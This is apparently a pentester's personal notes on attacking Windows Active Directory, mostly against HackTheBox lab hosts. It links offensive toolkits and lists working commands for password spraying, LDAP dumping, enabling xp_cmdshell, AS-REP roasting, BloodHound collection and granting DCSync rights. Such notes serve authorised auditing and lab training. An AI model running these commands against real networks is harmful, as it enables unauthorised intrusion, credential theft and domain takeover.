#### AD GROUP EXPLOIT
- [[AD_GROUP_EXPLOIT]]

#### RESSOURCE
- cool repos [winpwn](https://github.com/S3cur3Th1sSh1t/WinPwn) automations
- [Payload all the thing AD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#using-bloodhound)
- [OCD mindmap for AD audit (scroll down) ](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg)
- [WADComs is an interactive cheat sheet, containing a curated list of offensive security tools and their respective commands, to be used against Windows/AD environments.](https://wadcoms.github.io/)
- [Attack Active directory from zero to her (very cool stuff)](https://zer1t0.gitlab.io/posts/attacking_ad)
- [CVE DATABASE](https://cvepremium.circl.lu/)
- [list of ANSSI of potential AD Controle Point](https://www.cert.ssi.gouv.fr/uploads/guide-ad.html)

#### Exemple of standardised windows port
- 139 (smb)
	-  Try eternal blue 
		- nmap --script smb-vuln IP-RANGE
	- verify SMB protocol
		- crackmapexec smb IP-RANGE
	- enum smb
		- smbclient //IP/PATH -c 'recurse;ls'
- 135 (RPC)
	- impacket-rpcdump IP
	- impacket-lookupsid "user:pwd"@IP # if you have valid cred for this one. 

- 443 (smb)
- 445 (smb)
	- crackmapexec smb  -u username.txt -p password.txt --shares 10.10.10.149 # donne la capacitée de voir les droit d'acces au share. 
- 389 (LDAP)
	-  Reco
		- nmap -n -sV --script "ldap* and not brute" -p "IP" # liste les informations en lien avec le LDAP
	- Connexions
		- ldapsearch -x -H LDAP://IP -D 'LDAP-SERVER-NAME\ldap' -w 'PASSWORD' -b "CN=NMAP-LDAP-RESULT,DC=NMAP-LDAP-RESULT"
	- DUMP 
		- ldapdomaindump -u DMAIN\\USERS -p PASSWORD IP --no-json --no-grep # get 
- 1443 (mssql) 
	-  [msdat](https://github.com/quentinhardy/msdat) framwork d'audit du service ms-sql 
	- [ressource](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/) intéréssante sur le hack mssql
	- impacket-mssqlclient
		- enable xp_cmdshell # permet de lancer une comand a partir du mssql
- 3389 (RDP)
	- can try with XfreeRDP on linux  
		- xfreerdp /u:amdin /p:passwd /v:IP
	- Detect if vulnerable to [BLUEKEEP or other stuff](https://github.com/robertdavidgraham/rdpscan)

- 5985 (winRM HTTP) 
	- Detectec with this nuclei yaml: [[detect-winrm-HTTP]]
	- [EvilWinRM](https://github.com/Hackplayers/evil-winrm)
- 5986 (winRM HTTPS)
	- Detectec with this nuclei yaml: [[detect-winrm-HTTPS]]
	- [EvilWinRM](https://github.com/Hackplayers/evil-winrm)

#### command technique 
- ASREPROAST 
	- impacket-GetNPUsers painters.htb/ -dc-ip 192.168.110.55 -usersfile userlist.txt -format hashcat -outputfile o.txt
	- impacket-GetNPUsers DOMAIN/  -usersfile employe_name.txt -dc-ip IP
	- impacket-GetNPUsers htb.local/ -usersfile userlist.txt -dc-ip 10.10.10.161 -no-pass
  ### bloodhound export 
	- bloodhound-python -d domain_name.TLD   -u USERS -p PASSWORD  -gc computer_name.domain.TLD -c All -ns COMPUTER_IP # TLD stand for top level domain
### dcsync right 
-  Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity useracct1 -Rights DCSync